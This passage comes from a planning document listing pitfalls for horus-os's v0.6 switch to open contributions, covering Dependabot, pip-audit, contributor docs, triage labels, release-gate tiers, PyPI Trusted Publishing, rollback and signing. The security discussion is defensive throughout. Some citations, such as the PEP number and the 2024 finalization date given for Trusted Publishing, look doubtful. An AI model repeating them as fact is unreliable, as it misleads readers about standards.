- **Dependabot security PRs get a distinct label and a distinct PR template.** The label `security-update` triggers a separate CI workflow that runs an expanded test matrix (the regular matrix + the install-smoke on the new dep version). The PR body is auto-prefixed with "**SECURITY UPDATE** — review before any other Dependabot PR." This counters the visual-noise problem.
- **The "tracking file" pattern from pip-audit applies to Dependabot too.** If a Dependabot CVE PR cannot merge cleanly (test failure, breaking change in the dep), the maintainer opens `.github/pip-audit-tracking/GHSA-XXXX.md` documenting the holdup and the mitigation. The release gate (Pitfall 8) checks the tracking directory; any file older than 30 days fails the gate with a clear "you have unresolved security tracking; this release is not eligible to ship."
- **Service choice (OSV vs PyPI advisory):** pip-audit runs with `-s osv` for broader coverage, AND a second pip-audit pass with default `-s pypi` for the curated subset. If OSV flags something PyPI does not, the maintainer makes a judgement; the dual-run is what surfaces the difference. The cost is one additional pip-audit run (~10s); the benefit is that we never miss a CVE the curated db has not picked up yet (the [Bug #274 discussion](https://github.com/pypa/pip-audit/issues/274) on pypa/pip-audit explicitly documents the divergence).

**Warning signs:**
- The `.github/pip-audit-ignore.txt` file has more than 5 entries OR any entry older than 12 months without a justification update. The ignore list has become a "we don't actually look at security warnings" backdoor.
- A Dependabot PR labeled `security-update` has been open for >7 days. Maintainer triage failure; needs a follow-up.
- A grouped routine-bump PR includes any dependency listed in the GitHub Security tab as having an alert. Grouping leaked a security fix; reconfigure.
- pip-audit running against `[dev,otel]` extras shows different findings than against base; the differences are not documented in the tracking dir. Means the extras have unmanaged risk.
- A release ships and a downstream `pip-audit horus-os==0.6.0` immediately reports a CVE that was not in our release-time scan. Drift between our scan and theirs; investigate the service and the timestamp.

**Phase to address:**
**Phase 54 (supply-chain check substrate)** lands pip-audit configuration, the ignore-list discipline, the Dependabot grouping rules. **Phase 55 (Dependabot tuning)** specifically excludes security-updates from grouping, configures the `security-update` label and template, and wires the tracking-directory check. **Phase 58 (release-gate extension)** wires the tracking-file age check. Owner: SUPPLY-04 (pip-audit on PR), SUPPLY-05 (Dependabot config and exclusion), SUPPLY-06 (security tracking pattern). The exclusion rule MUST land before Dependabot itself is enabled — if Dependabot opens its first grouped-security PR before the exclusion is wired, that PR is the regression.

---

### Pitfall 6: CONTRIBUTING.md promises a 24h response, requires a Slack join, mandates a CLA — adoption-blocking anti-patterns

**What goes wrong:**
The CONTRIBUTING.md drafted at v0.6 flip-time, written by a maintainer who has been planning this for months, oversells what comes next. Three concrete failure shapes:

1. **Oversold response SLA.** "We respond to PRs within 24h" is the natural thing to write at flip-time when the queue is empty. Within two weeks, the queue is 8 PRs deep, the maintainer is on vacation, and every contributor whose PR sits for 3 days reads the docs and concludes "this project lied to me; horus-os is dead." Concretely: [the OSI / Socket survey](https://socket.dev/blog/the-unpaid-backbone-of-open-source) finds that 60% of unpaid OSS maintainers are considering quitting; [Intel's burnout writeup](https://www.intel.com/content/www/us/en/developer/articles/community/maintainer-burnout-a-problem-what-are-we-to-do.html) puts the average solo maintainer at 8.8 hours/week. A 24h response SLA is what a small *team* can promise; a solo maintainer with a day job cannot.

2. **Required CLA.** A CLA (Contributor License Agreement) is signed-document overhead — a PR's first comment is a CLA-bot reminder, the contributor signs a Google Form or a DocuSign or a `cla-assistant` page, the bot blesses the PR, the human can finally review. [Ben Balter's analysis](https://ben.balter.com/2018/01/02/why-you-probably-shouldnt-add-a-cla-to-your-open-source-project/) is the canonical reference: CLAs add legal overhead, slow contributors, and for permissive licenses (Apache 2.0 — horus-os's license) provide minimal incremental rights beyond what the license already grants. Apache 2.0 includes the patent grant (the main thing CLAs were invented to secure); a CLA on top of Apache 2.0 is largely belt-and-suspenders ceremony.

3. **Mandated Slack/Discord join.** "All contributors should join our Discord to coordinate" sounds welcoming. In practice it (a) gates participation on a real-time chat platform many contributors actively avoid for privacy or async-preference reasons, (b) creates a side channel where decisions happen off-record and contributors who don't join are second-class, (c) puts the maintainer on the hook for moderating an additional platform. The Discord may exist; mandating it is the trap.

A fourth, related: a CODEOWNERS file listing only the maintainer (the only contributor with merge rights). This is structurally the [bypass-is-the-maintainer situation](https://github.com/orgs/community/discussions/14866) — the maintainer's own PRs still require their own approval, and either the workflow is silently broken or the maintainer-as-admin clicks "Merge without approval" every time, defeating the entire CODEOWNERS purpose.

**Why it happens:**
- "Sound professional" at flip-time means using corporate-OSS language ("we respond within 24h", "all contributors sign our CLA"). The maintainer copies the boilerplate from a Google or Microsoft repo without realizing those boilerplates are sized for orgs with paid security teams.
- The CLA-as-default exists because a few high-profile projects (Apache Foundation projects, Google projects, CNCF projects) require them. For an Apache 2.0 project with no anticipated trademark/license-change events on the horizon, the CLA is overhead without commensurate protection.
- Discord/Slack as the "real" community is a 2020-era pattern (mid-pandemic, every project added one). The async-first GitHub-Discussions / GitHub-issues path is sufficient for most actually-distributed-collaboration use cases.

**How to avoid:**
- **The CONTRIBUTING.md states acknowledgement targets, not response targets.** "We aim to acknowledge new issues within 7 days" is honest and matches the solo maintainer's bandwidth. "Acknowledge" is cheap (a label, a one-line comment); "respond" implies a thoughtful reply. Distinguish them.
- **No CLA in v0.6. Apache 2.0's existing protections are deemed sufficient.** This is a documented decision in `.planning/decisions/no-cla.md` so the question does not re-litigate every six months. If a future enterprise contributor requires a CLA-equivalent, the [Developer Certificate of Origin (DCO)](https://developercertificate.org/) with `Signed-off-by:` line in commits is a lighter-weight alternative and can be added without retroactive impact. Document the DCO as the optional fallback; do not require it by default.
- **The Discord (if any) is optional, additive, not load-bearing.** CONTRIBUTING.md says "Discussions and issues are the canonical channel. A Discord exists at [link] for casual conversation; no project decisions happen there exclusively." If a decision DOES come up in Discord, the deciding party summarizes it back to a GitHub Discussion before acting. This rule has to be enforced by the maintainer or the side-channel forms anyway.
- **The CONTRIBUTING.md is the README of the contributor experience.** Concrete content (cribbing the v0.5 docs/PLUGINS.md shape):
  - **First section: what we accept.** Bug fixes (most welcome). Tests for existing behavior. Doc fixes. Adapter additions (with pre-discussion). New features ONLY after a Discussion thread agrees.
  - **Second section: what we don't accept.** New abstraction layers between SDKs and the runtime (per PROJECT.md "no provider abstraction"). Multi-tenant patterns. Hosted-SaaS features. Voice integrations. (Mirroring the PROJECT.md anti-goals; the contributor sees them before writing code.)
  - **Third section: how to claim work.** "Comment 'claim' on the issue. I will reply within 7 days assigning you or explaining why not. Please don't begin substantial work before the assignment." This is honest about the maintainer's bandwidth and prevents the "I worked on this for a weekend and now my PR is rejected" trap.
  - **Fourth section: PR expectations.** Tests for new behavior; doc updates if user-facing; CHANGELOG entry; license header NOT required per-file (PROJECT.md / CLAUDE.md). Three-OS gate runs on every PR.
  - **Fifth section: triage SLA — honest.** "We aim to acknowledge issues and PRs within 7 days. Resolution timeline depends on severity and maintainer capacity. We are a solo-maintainer project; please be patient." No 24h promise. No SLA the maintainer cannot keep.
- **CODEOWNERS lists the maintainer AS the codeowner, but branch protection rules allow admin bypass for maintainer-on-maintainer PRs.** This is a documented edge case in [GitHub Discussions #14866](https://github.com/orgs/community/discussions/14866). The fix is to scope CODEOWNERS by path AND enable "Allow specified actors to bypass required pull requests" with the maintainer's username — explicit bypass list, not "click through the warning" pattern. The bypass is logged so audit trail survives.
- **The triage SLA document (`docs/TRIAGE.md`)** documents the actual cadence: weekly issue triage on Sunday evenings (cribbed pattern from many small OSS projects), automated labeling on issue creation (`needs-triage` label that gets removed on first maintainer touch), and an explicit "the maintainer may go silent for up to 2 weeks at a time without warning" disclaimer. That disclaimer is what most CONTRIBUTING.md files omit and what every contributor wishes they had read up-front.

**Warning signs:**
- The CONTRIBUTING.md contains "24h" or "48h" or any specific-hour SLA. Edit to "7 days for acknowledgement."
- The CONTRIBUTING.md requires a CLA sign step. Pull it; document the decision; revisit only if the legal landscape changes.
- The CONTRIBUTING.md says "join our Discord to contribute" as a step in the contribution flow. Move Discord to optional; surface GitHub Discussions as canonical.
- CODEOWNERS lists only the maintainer with no bypass rule configured. Maintainer's own PRs cannot self-merge OR every merge has the "merge without approval" annotation. Either way, the audit story is broken.
- A first-week contributor opens an issue saying "I read CONTRIBUTING.md and expected X." X is the gap; the doc was wrong; revise.

**Phase to address:**
**Phase 56 (contributor docs)** lands CONTRIBUTING.md, the PR template, the issue templates, CODEOWNERS, and `docs/TRIAGE.md`. **Phase 57 (SECURITY.md update + supported-versions table refresh)** lands the corrected disclosure flow. The decision to not require a CLA must land in `.planning/decisions/` BEFORE Phase 56 so the docs do not bake in the wrong default. Owner: CONTRIB-01 (CONTRIBUTING.md), CONTRIB-02 (PR/issue templates), CONTRIB-03 (CODEOWNERS + bypass), CONTRIB-04 (triage SLA doc).

---

### Pitfall 7: Auto-close stale-bot eats real bugs; label taxonomy grows to 40 labels nobody uses

**What goes wrong:**
The natural triage automation reaches for [actions/stale](https://github.com/actions/stale) or the [probot/stale](https://github.com/probot/stale) bot: auto-label issues `stale` after 60 days of inactivity, auto-close after 90. This is the [Drew DeVault "GitHub stale bot considered harmful" critique](https://drewdevault.com/2021/10/26/stalebot.html) and the [Jacob Tomlinson "anti-user and anti-contributor"](https://jacobtomlinson.dev/posts/2024/most-stale-bots-are-anti-user-and-anti-contributor-but-they-dont-have-to-be/) writeup — both verified in the [Curtis Newton IEEE study](https://ieeexplore.ieee.org/document/8823598/) that found stale-bots disproportionately close legitimate issues the maintainer simply has not had time to triage. Concrete failure shape:
- A user files a real bug. Maintainer is on a v0.5 phase; cannot reproduce immediately; types "thanks, will look soon" — that counts as activity, resets the stale timer.
- Maintainer never gets back to it. 60 days later, bot adds `stale` label. User responds "still happening" — activity, timer resets.
- 60 days later again, bot adds `stale`. User has moved on. Bot closes. Bug is forgotten. Two years later, someone files the same bug.

Sister failure: the label taxonomy that grows over time. Each new release adds labels (`v0.5`, `v0.6`, `v0.7`, ...), each new contributor type adds labels (`first-time-contributor`, `dependabot`, ...), each new triage category adds labels (`needs-repro`, `cannot-repro`, `awaiting-info`, `triaged`, `needs-discussion`, `discussion-ready`, ...). At 40 labels nobody can remember which to apply; new issues get one label or zero, and the label-based filters in the dashboard return nothing useful.

Sister-sister failure: `good-first-issue` labels on issues that are NOT actually beginner-friendly. The maintainer labels something `good-first-issue` because it's bounded in scope, but it requires understanding three internal subsystems. A first-time contributor picks it up, sinks 8 hours into reading code, opens a PR with the wrong shape, gets feedback that requires a refactor, and gives up. The label was a trap — well-intentioned, but for an issue that should have been `good-second-issue` at best.

**Why it happens:**
- Stale-bots solve a real problem (issue tracker gets long, maintainer can't see signal in noise) the wrong way (closing tickets does not delete them; the ratio of signal-to-noise is unchanged; the bug count just gets hidden). The right solve is triage discipline, which is hard.
- Label taxonomy grows because adding a label is cheap (one click) and removing it is taboo (might miss something). The cost of un-maintained labels is invisible.
- `good-first-issue` is labeled by the maintainer, who has internal knowledge; the maintainer's "first" bar is calibrated to their own first month in the codebase, not to a contributor's. The mis-calibration is invisible until the contributor has bounced off.

**How to avoid:**
- **No `actions/stale` auto-close by default in v0.6.** Document the decision: stale issues are NOT closed automatically. They may be labeled `inactive` after 90 days for filtering purposes only, but the label has no automated follow-up. The right way to manage the issue tracker is weekly triage (Pitfall 6 covers the cadence). If the issue tracker becomes overwhelming, the remedy is more triage capacity, not auto-close.
- **A short, fixed label taxonomy** (≤15 labels, hard cap). Categories:
  - **Type:** `bug`, `feature`, `question`, `discussion`, `docs`.
  - **Status:** `needs-triage` (default on creation), `needs-repro`, `confirmed`, `wontfix`.
  - **Difficulty:** `good-first-issue`, `good-second-issue`, `hard`.
  - **Component:** `core`, `plugins`, `adapters`, `ci`, `docs`. (No per-version labels — those go in milestones.)
  Adding a label requires a PR to `docs/LABEL-TAXONOMY.md`. The PR forces a discussion of "does this fit an existing label?" before adding noise.
- **`good-first-issue` discipline.** A `good-first-issue` must satisfy:
  - **One-file change in 90% of cases** OR explicitly two-file change with the second file being a test for the first.
  - **No cross-subsystem knowledge required** — the issue's description names the file to edit and the lines.
  - **Existing tests in the same area** the contributor can read for shape.
  - **An acceptance-criteria checklist in the issue body** so the contributor knows when their PR is done.
  These rules are codified in `docs/TRIAGE.md`. A `good-first-issue` that does not satisfy them gets re-labeled `good-second-issue` or unlabeled.
- **Issue templates** (Phase 56) enforce shape:
  - **Bug template:** version, OS, Python, reproduce steps, expected vs actual. The fields are required; an issue without them gets labeled `needs-info` and a bot comment asks the reporter to fill them in.
  - **Feature template:** problem statement, proposed solution, alternatives considered, why-now. The "why-now" field forces the proposer to argue scope-fit before the maintainer reads.
  - **Security advisory template:** redirects to GitHub Security Advisories (private channel per SECURITY.md). The template prevents the "I filed a CVE in a public issue" mistake.
  - **Discussion template:** the broadest catch-all; no required fields beyond the problem statement.
- **Label health is a release-gate signal.** `scripts/release_gate.py` queries the label taxonomy and warns if any label has been unused for >180 days (candidate for removal) OR if total label count exceeds the documented cap. The warning is in the release notes draft; the maintainer can resolve it explicitly or accept it.

**Warning signs:**
- Issues with `good-first-issue` are NOT being claimed by new contributors AND existing contributors keep tagging issues with that label. The label is mis-calibrated; raise the bar.
- Issues with `good-first-issue` ARE being claimed but PRs are stalling after first round of feedback. The label is too generous; the issues were not actually beginner-friendly.
- The label count exceeds 15. Time to audit the taxonomy.
- The stale-bot has been re-proposed by a contributor. Re-link the Drew DeVault writeup and the decision doc; document the rejection.
- An issue closed by stale-bot in the GitHub history is reopened with the comment "this is still a problem" — every such occurrence is evidence the bot is wrong; track them in `.planning/incidents/` if we ever do enable a stale-bot.

**Phase to address:**
**Phase 56 (contributor docs)** lands the issue templates, the label taxonomy, and `docs/TRIAGE.md`. **Phase 58 (release-gate extension)** wires the label-health and label-count check. The "no stale-bot by default" decision lands in `.planning/decisions/no-stale-bot.md` BEFORE Phase 56 so the issue templates and triage doc do not assume one exists. Owner: TRIAGE-01 (templates), TRIAGE-02 (label taxonomy + doc), TRIAGE-03 (label-health check).

---

### Pitfall 8: New release-gate check is slow OR depends on a network service, gating the dev loop on flakes

**What goes wrong:**
v0.6 adds at least five new release-gate checks: signature presence, signature verification, SBOM presence, SBOM-matches-wheel diff, pip-audit clean (Pitfalls 3, 4, 5). Each check has a runtime and a network dependency:
- Signature presence: ~10ms (local file check).
- Signature verification: ~2s (sigstore-python loads, fetches Fulcio root cert, checks transparency log inclusion — needs network).
- SBOM presence: ~10ms.
- SBOM-matches-wheel: ~20s (fresh venv + pip install + pip list + diff).
- pip-audit (OSV + PyPI): ~30s (fetches advisory db).

Total: ~52s, mostly network. If the release gate runs on every PR (which it should, to catch regressions before merge), the dev loop on a small docs change pays ~52s for nothing. If the network is flaky, the same docs PR fails the gate three times in a row for no reason related to the code. The maintainer learns to retry-without-thinking, and the next time the gate fails because of a REAL regression, it gets retried until it passes (the [intermittent test = silent regression](https://docs.pytest.org/en/stable/how-to/skipping.html#randomly-failing-tests) lesson from the v0.4 retrospective).

A sister trap: the OSV mirror occasionally serves stale data or 502s. pip-audit times out, the gate fails, the maintainer retries, OSV is back, the gate passes. The same vulnerability that pip-audit would have caught on the first run gets ignored on the retry because the maintainer assumed "it was a flake." That is the failure mode pip-audit exists to prevent.

A second sister trap: sigstore Fulcio root cert refresh happens periodically. If Fulcio is rotating its root and our cached cert is stale, verification fails for an hour or two. Same pattern: maintainer retries; eventually it works; no audit trail of what changed.

**Why it happens:**
- Every check, in isolation, is "reasonable" — none takes more than 30 seconds.
- Stacked, they cross the threshold where developers stop caring about gate output.
- Network dependencies are the obvious failure mode for any CI gate but the temptation to add "one more network check" compounds.

**How to avoid:**
- **Two-tier release gate.** The "pre-merge" gate runs on every PR with FAST, LOCAL checks only:
  - Workflow YAML lint (Pitfall 1 / Pitfall 2).
  - SBOM presence (file exists in `dist/`).
  - Signature presence (file exists in `dist/`).
  - Docs-drift check (per v0.5 Pitfall 12, extended for v0.6 docs).
  - Static analysis (ruff, mypy, etc.) — already exists.
  Total: <10s. Network: none.
  The "pre-release" gate runs only on `release/*` branches and on tag pushes — when the maintainer is intentionally cutting a release:
  - Signature verification (sigstore-python network call).
  - SBOM-matches-wheel diff (fresh venv).
  - pip-audit (OSV + PyPI, dual-run).
  - Trusted Publishing dry-run (OIDC exchange against PyPI's test endpoint).
  Total: ~60s. Network: required. Runs once per release, not once per PR.
- **The "pre-release" gate has explicit offline-fallback semantics.** Each network-dependent check has a `--offline` mode used when the network is genuinely down:
  - Signature verification: ships with a pinned Fulcio root cert (`scripts/fulcio-root.pem`, updated at each release via a Dependabot-like flow); offline mode verifies against the pinned cert with a `--allow-stale-trust` flag that LOGS the staleness.
  - SBOM-matches-wheel: requires a venv; if offline, falls back to a checksum of the wheel against the SBOM's `bom-ref` field (proves the SBOM was generated against THIS wheel even if we cannot re-install).
  - pip-audit: requires a network; offline mode is "fail with explicit `OFFLINE_SKIP: pip-audit could not run` in the release notes" — never silently skip, always log.
  The offline modes are opt-in via `RELEASE_GATE_OFFLINE=1`; the default is "fail loud on network errors and re-run when network is back."
- **Network checks have explicit retry-with-backoff with a documented cap.** sigstore-python verification retries 3 times with exponential backoff (1s, 2s, 4s); pip-audit retries 2 times. After the cap, it FAILS with a specific error message ("Fulcio fetch timed out 3 times; check network or use RELEASE_GATE_OFFLINE=1"). The maintainer must explicitly choose offline mode; the default is never "silently retry forever and eventually pass."
- **The release-gate output is structured.** `scripts/release_gate.py --report dist/release_gate_report.json` writes a machine-readable report. Every check has `name`, `status` (pass/fail/skip/warn), `duration_ms`, `network_required`. Failures include a specific remediation. The report is attached to the GitHub Release as an asset so post-hoc audit is possible.
- **A "gate dry-run" mode for the maintainer.** `scripts/release_gate.py --dry-run` runs all checks locally before pushing the tag, so the gate's first run is on the maintainer's machine where a network failure can be diagnosed without burning a CI cycle. The dry-run is in `docs/RELEASE.md` as the recommended pre-tag step.

**Warning signs:**
- A PR's pre-merge gate took >30s. Some check has leaked from pre-release into pre-merge; identify and demote.
- The release gate's report shows network-required checks running on a PR (not a release). Tier separation broke.
- A maintainer retried the release gate 3+ times for the same tag. Either a real failure is being masked by retries OR a network check is flaky enough to warrant the explicit offline mode.
- The Fulcio root cert in `scripts/fulcio-root.pem` is more than 6 months old. Refresh via a Dependabot-equivalent; pin SHA.
- pip-audit's "OFFLINE_SKIP" message has appeared in any release notes. Acceptable once; if it recurs, the network resilience needs a hardening pass.

**Phase to address:**
**Phase 58 (release-gate extension)** lands the two-tier split, the offline-mode design, the structured report format, the dry-run mode. **Phase 53 (signing)** must coordinate: the signature verification step lives in pre-release tier, not pre-merge. **Phase 54 (supply-chain)** must coordinate: pip-audit on PRs is the supply-chain check, run from the supply-chain workflow, NOT from the release gate (the gate consumes its result, doesn't re-run it). Owner: REL-13 (two-tier gate), REL-14 (offline modes), REL-15 (structured report).

---

### Pitfall 9: PyPI Trusted Publishing not wired before the gate flip — first v0.6 release re-uses a long-lived token

**What goes wrong:**
The PyPI publish step needs auth. The "obvious" path is: maintainer generates a PyPI API token, stores it in `secrets.PYPI_API_TOKEN`, the publish workflow uses it. The token has full upload rights to the project. If any workflow leaks it (Pitfall 1's pull_request_target case, or a future "sourcemap leaked the env" bug), the attacker uploads a poisoned `0.6.1` to PyPI with the legitimate maintainer's auth and the ecosystem is compromised.

PyPI's [Trusted Publishing (PEP 807)](https://peps.python.org/pep-0807/) was finalized in late 2024 and is the answer: instead of a long-lived token, the workflow exchanges a short-lived GitHub OIDC token for a single-use PyPI upload credential, scoped to one publish, valid for ~10 minutes. The `secrets.PYPI_API_TOKEN` does not exist; there is nothing to leak. As of 2024-11, [PyPI also publishes the PEP 740 attestation alongside the wheel](https://blog.pypi.org/posts/2024-11-14-pypi-now-supports-digital-attestations/) automatically when published via Trusted Publishing using the official `pypa/gh-action-pypi-publish` action ≥v1.11.0.

The trap: v0.6 flips the gate (Phase 60) before Trusted Publishing is set up (Phase 53). The first v0.6 release uses `PYPI_API_TOKEN` because it's what was already in place. Now the token exists in secrets; even after Trusted Publishing is wired in v0.6.x, the token has to be explicitly revoked, AND every workflow that ever referenced it has to be audited for leak history, AND any logs that ran during the period when fork PRs could trigger workflows-with-secrets have to be reviewed. Cleaning up afterwards is strictly harder than not creating the token in the first place.

The Ultralytics incident is the precedent: their second wave of malicious releases (`8.3.45`, `8.3.46` on Dec 7 2024) bypassed GitHub Actions entirely and used a leaked PyPI token directly. Trusted Publishing prevents that class of attack.

**Why it happens:**
- The "I already have a PyPI account; let me just make a token" path is one minute of setup. Trusted Publishing requires configuring a PyPI project-side trust relationship (specifying the GitHub repo, the workflow filename, the environment), which is 5 minutes and requires reading docs.
- Trusted Publishing requires `id-token: write` permission on the workflow, which conflicts with the "default to read" hardening from Pitfall 1 unless explicitly scoped. The path of least resistance is the long-lived token.
- The GitHub UI does not surface "you should be using Trusted Publishing" anywhere visible; it just accepts the secret.

**How to avoid:**
- **PyPI Trusted Publishing is configured BEFORE the gate flip.** Phase 53 sets it up; Phase 60 (gate flip) verifies it is the publish path. There is never a window where `PYPI_API_TOKEN` exists in the repo's secrets.
- **The PyPI side configuration is documented in `docs/RELEASE.md` and pinned to the workflow path.** Per [PEP 807](https://peps.python.org/pep-0807/), the trust relationship binds `(repository, workflow filename, environment, branch)`. The horus-os binding is:
  - Repository: `Ridou/horus-os`
  - Workflow: `release.yml`
  - Environment: `pypi` (defined in repo settings with branch protection: only `main` and `release/*` branches can deploy to this environment)
  - Branch: implicit (any tag pushed from main)
  The binding is documented in `docs/RELEASE.md` so a future maintainer can recreate it if the PyPI project is migrated.
- **`id-token: write` is scoped to the publish job only.** The release workflow has the top-level `permissions: read-all`; the publish job overrides with `permissions: { id-token: write, contents: write }`. No other job in the workflow can mint an OIDC token. This prevents a malicious step earlier in the workflow from exchanging a token before the publish step runs.
- **`pypa/gh-action-pypi-publish@<SHA>` is used at version ≥1.11.0** so PEP 740 attestation publishing is automatic. The action's `attestations: true` flag (default in ≥1.11.0) attaches the sigstore bundle to the PyPI publication. Downstream `pip install` with PEP 740 verification (post-pip-25.x) sees the attestation.
- **A `secrets.PYPI_API_TOKEN` audit check in the release gate.** `scripts/release_gate.py` shells out to `gh secret list --repo Ridou/horus-os --json name` and asserts no secret with `PYPI` in its name exists. If one exists (even unused), the gate fails. The maintainer is forced to revoke it.
- **The PyPI publish step has a `dry-run` flag in the workflow** (using `--repository testpypi`) for the maintainer to use BEFORE flipping the gate. The first real publish via Trusted Publishing is to test.pypi.org, verified end-to-end, then the production publish lights up.

**Warning signs:**
- The repo has a secret named `PYPI_API_TOKEN`, `TWINE_PASSWORD`, `PYPI_PASSWORD`, or similar. Audit fail.
- The release workflow does NOT use `pypa/gh-action-pypi-publish@<SHA>` with `attestations: true`. PEP 740 chain is broken.
- The PyPI project does not show "Trusted Publisher: GitHub Ridou/horus-os via release.yml" in its settings. Trust relationship not configured.
- A release publishes successfully but `pip install horus-os==0.6.0` (with verify) does not surface the attestation. The chain is broken somewhere; investigate.
- The publish job runs `id-token: write` at workflow-level, not job-level. Permissions are over-scoped.

**Phase to address:**
**Phase 53 (signing substrate)** wires Trusted Publishing as part of the same milestone that wires sigstore signing — the two are conceptually a single "publish pipeline" change. **Phase 58 (release-gate extension)** wires the no-PYPI-token audit. **Phase 60 (gate flip)** verifies Trusted Publishing is the only publish path; this is a release-gate prerequisite, not a "after we flip" cleanup. Owner: SIGN-04 (Trusted Publishing), SIGN-05 (env-scoped permissions), REL-16 (no-token audit). The chronology must hold: TP-before-flip, not flip-then-TP.

---

### Pitfall 10: The gate flip has no rollback plan; first-week PR volume overwhelms the maintainer

**What goes wrong:**
v0.6.0 ships, STATUS.md updates to "contributions OPEN", the README CTA changes, the pinned Discussion announces the flip. Within 72 hours, the maintainer has:
- 8 PRs from genuine first-time contributors, all needing first-feedback.
- 2 PRs from the malicious-fork campaign (Pitfall 1 — let's assume the CI hardening held).
- 30+ new issues, most of them duplicates of existing ones.
- A spike in Discord activity (Pitfall 6 — let's assume Discord exists but is optional; it's still a notification source).
- Existing v0.4 / v0.5 users filing real bugs that were not visible before because nobody was looking.

The maintainer has a day job. Within a week the queue is 40 items deep, response times are 2 weeks instead of 7 days (Pitfall 6's SLA), contributors who were excited at week 1 are disengaged by week 3, and the project's reputation is "open but unresponsive." The window for first-impression is closed. The PRs that were accepted in the first 72 hours include one that introduced a subtle regression that nobody had bandwidth to fully review; v0.6.1 is an emergency patch.

The rollback failure: there is no documented path to flip the gate back to "solo mode." STATUS.md is the canonical document, but it would require a careful rewrite. CONTRIBUTING.md would need to re-promise "not accepting PRs." The pinned Discussion would need an embarrassing follow-up. The maintainer leaves the gate open out of pride / sunk cost, the situation compounds.

**Why it happens:**
- The gate flip is treated as a one-way door. Once "OPEN," reverting feels like failure. The reality is that "OPEN" is a capacity decision the maintainer makes every quarter; revisiting it is normal.
- First-week volume is unpredictable. The flip might land with 2 PRs in week 1 (under-flow) or 30 (over-flow). Neither is a "wrong" outcome; both need an explicit plan.
- The maintainer's bandwidth is fixed but the demand is elastic. Without throttles, demand expands to fill the response capacity.

**How to avoid:**
- **The gate flip is a single-commit change with a documented rollback.** STATUS.md's TL;DR section is updated by editing 3 lines; CONTRIBUTING.md's first section is updated by editing 5 lines. Rollback = revert that commit. The PR that flips the gate is named `feat(60): flip contribution gate — v0.6 readiness` and the immediate reverse-PR template is checked into `.planning/rollback/flip-gate-revert.md`. The maintainer can flip back in <10 minutes if needed.
- **A first-week throttle: PRs require a maintainer's `accepted-for-review` label before CI runs the full matrix.** Phase 51's `safe-to-test` label gate handles secrets-needing CI; this is the next level up — the label-gating extends to the WHOLE matrix in the first 30 days. Contributors are told in the PR template: "your PR will be triaged within 7 days. Please don't ping; the maintainer will label `accepted-for-review` when ready." The throttle is documented as "temporary; lifts at v0.6.30 (30 days after flip) once we have a clearer sense of volume."
- **A "soft launch" before the hard flip.** Phase 59 (the phase before flip): invite 3-5 specific contributors (vetted via Discussions over the previous milestones) to file a sample PR each — bug fix, docs PR, adapter addition, plugin example, refactor. The maintainer runs the full contribution flow against each, identifies friction points, fixes them BEFORE the flip. The contributors get credit in the v0.6.0 CHANGELOG.
- **An explicit "if X then revert" decision matrix in `docs/POSTFLIP-PLAYBOOK.md`:**
  - Open issue count exceeds 75 → freeze gate (no new PRs, existing PRs continue) for one week.
  - Open PR count exceeds 25 → freeze gate.
  - Maintainer's "responses sent this week" drops below 5 → freeze gate.
  - A secret rotation event occurs → freeze gate, audit, patch, then re-open.
  - Three weeks of < 1-PR-per-week → no action (under-flow is fine; the gate stays open).
- **A weekly triage cadence with a hard time-box.** `docs/TRIAGE.md` documents: Sunday evening, 2-3 hours, walk the issue and PR queue. Issues that don't get triaged in the 2-3 hours roll to next week. PRs not reviewed in that window get a one-line "I'll look next week" — Pitfall 6's "acknowledgement target." If the maintainer cannot make Sunday for any reason, the queue gets a one-line Discussion comment: "no triage this week; back next Sunday." This is the [Open Source Guides "Maintaining Balance" pattern](https://opensource.guide/maintaining-balance-for-open-source-maintainers/).
- **Burnout triggers a real freeze.** If the maintainer reaches the explicit triggers in `docs/POSTFLIP-PLAYBOOK.md` (any of: >2 weeks without a meaningful triage session; sleep impact; ratio of "weeks worked" to "weeks rested" drops below 4:1), the gate freezes for a documented period. The freeze is announced in the pinned Discussion. Frozen-gate periods are normal; concealing them is the problem.

**Warning signs:**
- Open PR queue exceeds 25. Hit the throttle.
- Median PR response time exceeds 14 days. Hit the throttle.
- Maintainer skips the weekly triage cadence two weeks in a row. Hit the throttle.
- A contributor opens a Discussion asking "is this project still maintained?" Hit the throttle.
- The maintainer has not been able to ship a release in 3 months. Possible burnout signal; consult `docs/POSTFLIP-PLAYBOOK.md`.

**Phase to address:**
**Phase 59 (soft launch)** runs the invited-contributor dry-run. **Phase 60 (gate flip)** is the actual flip with the rollback PR template ready. `docs/POSTFLIP-PLAYBOOK.md` lands in Phase 60 alongside the flip. Owner: GATE-01 (rollback PR), GATE-02 (soft-launch invitees), GATE-03 (postflip playbook). The playbook MUST exist before the flip; flipping without an exit plan is the trap that lasts months.

---

### Pitfall 11: Signed tag with unsigned Release artifacts (or vice versa); CHANGELOG drift breaks the trust chain

**What goes wrong:**
The release process produces several artifacts that all claim to attest "this is horus-os 0.6.0":
- A signed git tag (`git tag -s v0.6.0` or via gitsign).
- A wheel + sdist published to PyPI with a PEP 740 attestation.
- A GitHub Release with the wheel + sdist attached, plus a `.sigstore` bundle for each artifact, plus the SBOM.
- A CHANGELOG.md entry.
- A SECURITY.md updated supported-versions table.

If any of these is out of sync, the trust chain breaks. Concrete failure modes:
1. **Tag signed, Release artifacts unsigned.** Maintainer runs `git tag -s v0.6.0 && git push --tags`, then the Release workflow runs and forgets to attach the `.sigstore` bundles. Downstream user verifies the tag (passes), downloads the wheel from the Release, runs sigstore-python verify, fails ("no bundle found"). The user's only options are to trust the unsigned wheel or to skip the release.
2. **Tag signed by long-lived key that leaks.** If we use `git tag -s` with a long-lived GPG key (instead of gitsign with OIDC), and the maintainer's GPG private key is exposed (laptop loss, malware, etc.), an attacker can sign a forged `v0.6.1` tag that LOOKS like ours. The keyless OIDC flow (gitsign or sigstore-python for tags via [the tag signing PEP discussion](https://discuss.python.org/t/pep-740-attestation-publishing-on-pypi/56294)) makes this much harder because the OIDC identity is workflow-scoped.
3. **Signing identity doesn't match the OSS project's claimed identity.** The signed git tag's signer is `Santino <santino62@gmail.com>` (personal email); the sigstore wheel signature's identity is `https://github.com/Ridou/horus-os/.github/workflows/release.yml@refs/tags/v0.6.0` (workflow). A downstream user trying to verify "is this really from the horus-os project" has to cross-reference TWO different identities, neither of which says "the horus-os project." If the maintainer changes the email on git commits (Pitfall: contributor's email policy), the signature chain breaks for historical tags.
